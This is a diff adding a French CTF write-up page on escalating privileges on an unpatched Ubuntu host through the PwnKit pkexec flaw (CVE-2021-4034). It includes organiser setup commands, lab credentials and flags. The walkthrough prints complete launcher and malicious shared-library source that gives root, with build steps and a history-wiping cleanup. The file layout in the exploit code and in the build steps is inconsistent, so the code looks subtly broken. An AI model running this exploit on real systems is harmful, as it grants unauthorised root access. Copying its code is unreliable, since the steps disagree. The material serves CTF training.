@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>SHADOW-5 - CryptAbyss 2026</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "SHADOW-5";
+        var mkdocs_page_input_path = "Systeme\\writeup_PwnKit_SHADOW-5.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> CryptAbyss 2026
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Accueil</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Reseau</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Reseaux/Flag060-Analyse_capture_r%C3%A9seau/">Analyse_capture_réseau</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Reseaux/Flag114-pcap-forensic/">cap-forensic-mot de passe d'un archive</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Forensic</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier1-magic-bytes/">Tier 1 — Magic Bytes</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier2-file-carving/">Tier 2 — File Carving</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier3-memory-dump/">Tier 3 — Memory Dump</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier4-disk-registre/">Tier 4 — Disk + Registre</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Cryptographie</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge1/">Challenge 1 - Base64</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/challenge2/">Challenge 2 - Multi-layer Caesar</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/Double_Encryption_0142/">Double encryption</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/Myrox_Infiltration_0143/">Myrox Infiltration</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../crypto/writeup_falsification/">Falsification</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">osint</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../osint/Atterissage_Urgence_0145/">Atterrisage Urgence</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Stegano</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../steganographie/Transmission_Alien_0141/">Transmission Alien</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Reverse</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../reverse/strings-0084/">Strings on binary</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../reverse/binary-analyze-0083/">Binary analyze</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../reverse/patch-xxxx/">Binary patching</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../reverse/writeup_reverseEngineering/">ReverseEngineering</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Logiciel</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../logiciel/writeup_blocsCompresse/">Blocs Compressés</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../logiciel/writeup_obfuscation/">Obfuscation</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../logiciel/writeup_polygotte/">Polygotte</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Systeme</span></p>
+              <ul class="current">
+                  <li class="toctree-l1"><a class="reference internal" href="../writeup_SUID_XENON-1/">XENON-1</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../writeup_CronTab_HERALD-7_v2/">HERALD-7</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../writeup_DirtyPipe_PROMETHEUS-9_v2/">PROMETHEUS_9</a>
+                  </li>
+                  <li class="toctree-l1 current"><a class="reference internal current" href="#">SHADOW-5</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#informations-du-challenge">Informations du challenge</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#description">Description</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#mise-en-place-de-lenvironnement-organisateurs">Mise en place de l'environnement (organisateurs)</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#prerequis">Prérequis</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#creation-des-flags-et-de-lenvironnement">Création des flags et de l'environnement</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#write-up-resolution-pas-a-pas">Write-up — Résolution pas à pas</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#etape-1-connexion-et-reconnaissance-initiale">Étape 1 — Connexion et reconnaissance initiale</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#etape-2-decouverte-du-flag-intermediaire-chiffre">Étape 2 — Découverte du flag intermédiaire chiffré</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#etape-3-identification-de-la-surface-dattaque">Étape 3 — Identification de la surface d'attaque</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#etape-4-comprehension-de-la-vulnerabilite">Étape 4 — Compréhension de la vulnérabilité</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#etape-5-preparation-de-lexploit">Étape 5 — Préparation de l'exploit</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#etape-6-compilation-et-declenchement">Étape 6 — Compilation et déclenchement</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#etape-7-obtention-du-flag">Étape 7 — Obtention du flag</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#resume-de-lattaque">Résumé de l'attaque</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#nettoyage-post-ctf">Nettoyage (post-CTF)</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#flags">Flags</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#references">Références</a>
+    </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../writeup_PHANTOM-4/">PHANTOM-4</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Misc</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../autre/Destruction_Vaisseau_0144/">Destruction Vaisseau</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">CryptAbyss 2026</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" aria-label="Docs"></a></li>
+          <li class="breadcrumb-item">Systeme</li>
+      <li class="breadcrumb-item active">SHADOW-5</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="write-up-ghost-in-the-shadows">Write-up — Ghost in the Shadows</h1>
+<p><strong>CryptAbyss CTF 2026 | Catégorie : Linux Privilege Escalation</strong></p>
+<hr />
+<h2 id="informations-du-challenge">Informations du challenge</h2>
+<table>
+<thead>
+<tr>
+<th>Champ</th>
+<th>Détail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Nom</td>
+<td>Ghost in the Shadows</td>
+</tr>
+<tr>
+<td>Vaisseau</td>
+<td>SHADOW-5</td>
+</tr>
+<tr>
+<td>CVE</td>
+<td>CVE-2021-4034 (PwnKit)</td>
+</tr>
+<tr>
+<td>CVSS</td>
+<td>7.8 — CRITICAL</td>
+</tr>
+<tr>
+<td>Difficulté</td>
+<td>Hard</td>
+</tr>
+<tr>
+<td>Catégorie</td>
+<td>System</td>
+</tr>
+<tr>
+<td>OS cible</td>
+<td>Ubuntu 20.04.3 LTS (Focal Fossa)</td>
+</tr>
+<tr>
+<td>Version polkit cible</td>
+<td>0.105-26ubuntu1</td>
+</tr>
+<tr>
+<td>Auteur</td>
+<td>Jeffrey JOANNEN / System</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="description">Description</h2>
+<blockquote>
+<p>Vous avez obtenu un accès SSH limité au vaisseau SHADOW-5 en tant qu'utilisateur <code>operative</code>. L'administrateur n'a pas patché son système depuis un moment…</p>
+<p>Un secret de root vous attend dans <code>/root/flag.txt</code>. Trouvez comment élever vos privilèges.</p>
+</blockquote>
+<p><strong>Accès fourni :</strong></p>
+<pre><code>User : operative
+Pass : AlienGetto2021!
+</code></pre>
+<hr />
+<h2 id="mise-en-place-de-lenvironnement-organisateurs">Mise en place de l'environnement (organisateurs)</h2>
+<h3 id="prerequis">Prérequis</h3>
+<ul>
+<li>VM Ubuntu 20.04 LTS <strong>non patchée</strong> (snapshot avant <code>apt upgrade</code>)</li>
+<li>polkit version <code>0.105-26ubuntu1</code> ou antérieure (toute version <code>&lt; 0.121</code> est vulnérable)</li>
+<li>Le patch <code>USN-5252-1</code> (janvier 2022) ne doit <strong>pas</strong> être appliqué</li>
+</ul>
+<h3 id="creation-des-flags-et-de-lenvironnement">Création des flags et de l'environnement</h3>
+<pre><code class="language-bash"># Vérifier que pkexec est bien vulnérable
+dpkg -l policykit-1
+# policykit-1  0.105-26ubuntu1  amd64  ← OK, vulnérable
+
+ls -la /usr/bin/pkexec
+# -rwsr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec  ← bit SUID présent
+
+# Utilisateur joueur (sans droits privilégiés)
+useradd -m -s /bin/bash operative
+echo &quot;operative:AlienGetto2021!&quot; | chpasswd
+gpasswd -d operative sudo 2&gt;/dev/null || true
+gpasswd -d operative docker 2&gt;/dev/null || true
+gpasswd -d operative lxd 2&gt;/dev/null || true
+
+# Flag final
+echo &quot;CryptAbyss{CVE_2021_4034_SH4D0W_5_G0N3_D4RK}&quot; &gt; /root/flag.txt
+chmod 600 /root/flag.txt
+chown root:root /root/flag.txt
+
+# Flag intermédiaire 1 — chiffré AES-256-CBC dans un dotfile, dans un dossier caché
+mkdir -p /var/.shadow/.intel
+echo -n &quot;CryptAbyss{1NT3L_4RCH1V3S_L0C4T3D_SH4D0W_N3TW0RK}&quot; \
+    | openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 -a \
+      -pass pass:'Shadow5-Intel-Archive-2094!' \
+    &gt; /var/.shadow/.intel/.classified.txt
+chmod 644 /var/.shadow/.intel/.classified.txt
+
+# Dossier-leurre pour brouiller les pistes (ne contient pas de flag)
+mkdir -p /tmp/.operative
+
+# Lore : journal de bord interne (indices partiellement masqués, passphrase à moitié censurée)
+mkdir -p /home/operative/Note
+cat &gt; &quot;/home/operative/Note/.Note#119&quot; &lt;&lt; 'LORE'
+[ JOURNAL DE BORD INTERNE VAISSEAU SHADOW-5 ]
+
+Cycle 2094.22 Rapport securite :
+  Composant    : CONFIDENTIAL
+  Version      : CONFIDENTIAL
+  Patch ********* : NON APPLIQUE
+
+Cycle 2094.25 Note personnelle :
+  Toute version ******* est concernee.
+  CONFIDENTIAL invoque avec ****=**** effectue une lecture ******.
+  Il lit ****[****] comme *****[****] puis y reecrit —
+  corrompant l'environnement d'execution.
+  En forgeant *********, on charge un .so arbitraire
+  en contexte SUID root.
+
+  Un fichier d'intel des patrouille est chiffre dans les variables de renseignement.
+  La passphrase que j'ai reçu est à moitié censurée pour des raisons de sécurité.
+  Il faut que vous la deviniez pour déchiffrer
+  Voici la passphrase : 'S******-Intel-Archive-****!'.
+
+  Notre version ******* est largement dans la plage.
+Responsable securite #119
+[ FIN DU JOURNAL ]
+LORE
+chown operative:operative &quot;/home/operative/Note/.Note#119&quot;
+chmod 600 &quot;/home/operative/Note/.Note#119&quot;
+</code></pre>
+<p>Vérification :</p>
+<pre><code class="language-bash">dpkg -l policykit-1 | grep ii
+ls -la /usr/bin/pkexec
+id operative
+</code></pre>
+<hr />
+<h2 id="write-up-resolution-pas-a-pas">Write-up — Résolution pas à pas</h2>
+<h3 id="etape-1-connexion-et-reconnaissance-initiale">Étape 1 — Connexion et reconnaissance initiale</h3>
+<pre><code class="language-bash">id
+# uid=1001(operative) gid=1001(operative) groups=1001(operative)
+
+uname -a
+# Linux shadow-5 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
+
+cat /etc/os-release | head -4
+# NAME=&quot;Ubuntu&quot;
+# VERSION=&quot;20.04.3 LTS (Focal Fossa)&quot;
+
+sudo -l
+# User operative may not run sudo on shadow-5.
+</code></pre>
+<p>Pas de sudo. On passe à l'énumération SUID et du système de fichiers.</p>
+<h3 id="etape-2-decouverte-du-flag-intermediaire-chiffre">Étape 2 — Découverte du flag intermédiaire chiffré</h3>
+<pre><code class="language-bash">find /var -type f -path '*shadow*' 2&gt;/dev/null
+# /var/.shadow/.intel/.classified.txt
+
+cat /var/.shadow/.intel/.classified.txt
+# U2FsdGVkX18wq/ZQ8C5wT8Cis9TsTpsZWkseEAMVtiYPNdSaGrl7iuPc2YLXmSKg
+# EMtp8JL5yGbJkZM/E8mmOdurYisfJwabkC223rs4oik=
+</code></pre>
+<p>Contenu chiffré OpenSSL. On note au passage l'existence de <code>/tmp/.operative/</code>, un dossier vide servant de leurre — il ne contient aucun flag.</p>
+<p>On lit le lore caché pour trouver la passphrase :</p>
+<pre><code class="language-bash">cat &quot;/home/operative/Note/.Note#119&quot;
+</code></pre>
+<p>Le journal donne la passphrase à moitié censurée : <code>'S******-Intel-Archive-****!'</code>. Deux indices permettent de la reconstituer :
+- le nom du vaisseau, <strong>SHADOW-5</strong>, donne le mot masqué de 6 caractères après le <code>S</code> → <code>hadow5</code>
+- l'année récurrente du scénario, mentionnée partout dans les journaux de bord (« Cycle 2094.xx ») → <code>2094</code></p>
+<p>La passphrase complète est donc : <code>Shadow5-Intel-Archive-2094!</code></p>
+<pre><code class="language-bash">openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -a \
+    -in /var/.shadow/.intel/.classified.txt \
+    -pass pass:'Shadow5-Intel-Archive-2094!'
+# CryptAbyss{1NT3L_4RCH1V3S_L0C4T3D_SH4D0W_N3TW0RK}
+</code></pre>
+<h3 id="etape-3-identification-de-la-surface-dattaque">Étape 3 — Identification de la surface d'attaque</h3>
+<pre><code class="language-bash"># Chercher tous les binaires avec le bit SUID
+find / -perm -4000 -type f 2&gt;/dev/null
+
+# Résultat intéressant :
+# /usr/bin/pkexec   ← cible principale
+# /usr/bin/passwd
+# /usr/bin/su
+# /usr/bin/newgrp
+
+# Vérifier la version exacte de polkit
+dpkg -l policykit-1 | grep ii
+# ii  policykit-1  0.105-26ubuntu1  amd64
+</code></pre>
+<p>La version <code>0.105-26ubuntu1</code> est antérieure à <code>0.121</code> — elle est <strong>vulnérable à CVE-2021-4034 (PwnKit)</strong>. Le reste du lore décrit déjà le mécanisme : un composant invoqué avec des arguments vides, une lecture hors limites, et le chargement d'une bibliothèque <code>.so</code> arbitraire en contexte SUID.</p>
+<h3 id="etape-4-comprehension-de-la-vulnerabilite">Étape 4 — Compréhension de la vulnérabilité</h3>
+<p>CVE-2021-4034 est une vulnérabilité de type <strong>out-of-bounds write</strong> dans <code>pkexec</code>, le binaire SUID de polkit, présente sur pratiquement toutes les distributions Linux depuis 2009.</p>
+<p><strong>Mécanisme de la faille :</strong></p>
+<p>Lorsque <code>pkexec</code> est invoqué avec un <code>argc</code> égal à zéro (tableau <code>argv</code> vide), il tente malgré tout de lire <code>argv[1]</code>. Ce pointeur sort des limites de <code>argv</code> et pointe directement dans <code>envp[0]</code>. <code>pkexec</code> réécrit ensuite cette valeur en croyant manipuler un argument de ligne de commande, corrompant silencieusement l'environnement.</p>
+<p>En forgeant <code>envp[0]</code> avec un chemin contrôlé et en détournant la variable <code>GCONV_PATH</code>, on force <code>pkexec</code> (qui tourne en SUID root) à charger une bibliothèque partagée malveillante — ce qui donne l'exécution de code en tant que root.</p>
+<pre><code>argv[]  → [NULL]                 ← argc = 0, intentionnellement vide
+                ↑ OOB read → pkexec lit envp[0] comme argv[0]
+envp[]  → [&quot;pwnkit.so:.&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=pwnkit&quot;, &quot;GCONV_PATH=.&quot;, NULL]
+                ↑ pkexec réécrit envp[0] → corruption de l'environnement
+                ↓ GCONV_PATH détourné → chargement de pwnkit.so (bibliothèque malveillante)
+Constructeur pwn() → setuid(0) + cat /root/flag.txt
+</code></pre>
+<h3 id="etape-5-preparation-de-lexploit">Étape 5 — Préparation de l'exploit</h3>
+<pre><code class="language-bash">mkdir /tmp/pwn &amp;&amp; cd /tmp/pwn
+</code></pre>
+<p><strong>Fichier <code>exploit.c</code> — le lanceur :</strong></p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+void fatal(const char *msg) { perror(msg); exit(1); }
+
+int main(void) {
+    // argv vide : déclenche l'OOB read dans pkexec (argc = 0)
+    char *argv[] = { NULL };
+
+    // envp forgé : envp[0] sera lu comme argv[0] par pkexec
+    char *envp[] = {
+        &quot;pwnkit.so:.&quot;,
+        &quot;PATH=GCONV_PATH=.&quot;,
+        &quot;CHARSET=pwnkit&quot;,
+        &quot;GCONV_PATH=.&quot;,
+        NULL
+    };
+
+    // Création de la structure de répertoires attendue
+    system(&quot;mkdir -p 'GCONV_PATH=.'&quot;);
+    system(&quot;cp /usr/bin/pkexec 'GCONV_PATH=./pwnkit.so:.'&quot;);
+    system(&quot;mkdir -p 'pwnkit.so:.'&quot;);
+
+    execve(&quot;/usr/bin/pkexec&quot;, argv, envp);
+    fatal(&quot;execve&quot;);
+}
+</code></pre>
+<p><strong>Fichier <code>payload.c</code> — la bibliothèque malveillante :</strong></p>
+<pre><code class="language-c">#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+// Exécuté automatiquement au chargement du .so
+// pkexec tourne en SUID root → setuid(0) fonctionne
+void __attribute__((constructor)) pwn(void) {
+    setuid(0);
+    setgid(0);
+    system(&quot;id; cat /root/flag.txt&quot;);
+}
+</code></pre>
+<h3 id="etape-6-compilation-et-declenchement">Étape 6 — Compilation et déclenchement</h3>
+<pre><code class="language-bash"># Compiler la bibliothèque malveillante
+gcc -shared -fPIC -nostartfiles -o pwnkit.so payload.c
+
+# Compiler le lanceur
+gcc -o exploit exploit.c
+
+# Créer la structure de fichiers pour GCONV_PATH
+mkdir -p 'GCONV_PATH=.'
+cp pwnkit.so 'GCONV_PATH=./pwnkit'
+echo &quot;module UTF-8// PWNKIT// pwnkit 2&quot; &gt; 'GCONV_PATH=./gconv-modules'
+
+# Lancer l'exploit
+./exploit
+</code></pre>
+<p><strong>Sortie attendue :</strong></p>
+<pre><code>uid=0(root) gid=0(root) groups=0(root)
+CryptAbyss{CVE_2021_4034_SH4D0W_5_G0N3_D4RK}
+</code></pre>
+<h3 id="etape-7-obtention-du-flag">Étape 7 — Obtention du flag</h3>
+<p><strong>Flag :</strong> <code>CryptAbyss{CVE_2021_4034_SH4D0W_5_G0N3_D4RK}</code></p>
+<hr />
+<h2 id="resume-de-lattaque">Résumé de l'attaque</h2>
+<pre><code>operative (uid=1001)
+    ↓ find /var → /var/.shadow/.intel/.classified.txt (chiffré)
+    ↓ cat lore → passphrase à moitié censurée → reconstituée via &quot;Shadow5&quot; + &quot;2094&quot;
+    ↓ openssl enc -d → flag intermediaire 1
+    ↓ find / -perm -4000 → /usr/bin/pkexec avec bit SUID détecté
+    ↓ dpkg -l policykit-1 → 0.105-26ubuntu1 → CVE-2021-4034 confirmé
+    ↓ compile exploit.c + payload.c
+    ↓ ./exploit → argc=0 → OOB write dans pkexec → GCONV_PATH détourné
+    ↓ pwnkit.so chargé en contexte SUID root → constructeur pwn()
+root shell (uid=0)
+    ↓ cat /root/flag.txt
+CryptAbyss{CVE_2021_4034_SH4D0W_5_G0N3_D4RK}
+</code></pre>
+<hr />
+<h2 id="nettoyage-post-ctf">Nettoyage (post-CTF)</h2>
+<pre><code class="language-bash"># Mettre à jour polkit pour corriger la faille
+apt-get install --only-upgrade policykit-1
+
+# Effacer les fichiers temporaires
+rm -rf /tmp/pwn
+
+# Effacer l'historique
+history -c &amp;&amp; rm ~/.bash_history
+</code></pre>
+<hr />
+<h2 id="flags">Flags</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Valeur</th>
+<th>Forme déposée sur le disque</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Intermédiaire 1</td>
+<td><code>CryptAbyss{1NT3L_4RCH1V3S_L0C4T3D_SH4D0W_N3TW0RK}</code></td>
+<td>Chiffré AES-256-CBC (base64) dans <code>/var/.shadow/.intel/.classified.txt</code>, passphrase à reconstituer via le lore</td>
+</tr>
+<tr>
+<td>Final</td>
+<td><code>CryptAbyss{CVE_2021_4034_SH4D0W_5_G0N3_D4RK}</code></td>
+<td>En clair dans <code>/root/flag.txt</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="references">Références</h2>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-4034">NVD — CVE-2021-4034</a></li>
+<li><a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">Qualys Security Advisory</a></li>
+<li><a href="https://ubuntu.com/security/notices/USN-5252-1">Ubuntu Security Notice USN-5252-1</a></li>
+<li><a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683">polkit upstream commit de correction</a></li>
+</ul>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../writeup_DirtyPipe_PROMETHEUS-9_v2/" class="btn btn-neutral float-left" title="PROMETHEUS_9"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../writeup_PHANTOM-4/" class="btn btn-neutral float-right" title="PHANTOM-4">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../writeup_DirtyPipe_PROMETHEUS-9_v2/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../writeup_PHANTOM-4/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script src="../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../..";</script>
+    <script src="../../js/theme_extra.js"></script>
+    <script src="../../js/theme.js"></script>
+      <script src="../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
